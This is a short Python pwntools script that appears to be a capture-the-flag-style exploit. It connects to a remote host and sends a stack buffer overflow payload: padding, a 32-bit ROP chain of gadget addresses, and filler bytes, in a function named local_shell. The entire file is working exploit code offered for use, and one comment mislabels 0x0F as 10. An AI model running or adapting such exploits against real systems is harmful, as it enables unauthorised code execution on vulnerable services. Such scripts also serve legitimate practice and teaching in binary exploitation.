#!/usr/bin/env python3
#coding: utf-8

from pwn import *
from struct import pack
from constants import *

def local_shell():
    conn = remote(HOST,PORT)
    p = b''.join([
        b'A'*OFFSET,
        pack('<I', 0x08063fb1), # pop ecx ; add al, 0xf6 ; ret
		pack('<I', 0x0000000F), # 10
        pack('<I', 0x080af4a6), # push esp ; ret
        pack('<I', 0x080af496), # pop eax ; ret
        pack('<I', 0x0805ed81), # add eax, ecx ; ret
        pack('<I', 0x080af446), # push eax ; ret
        b'C'*40
    ])
    conn.send(p)
    conn.recvline()
    conn.close()

def main():
    local_shell()
    
if __name__ == '__main__':
    main()
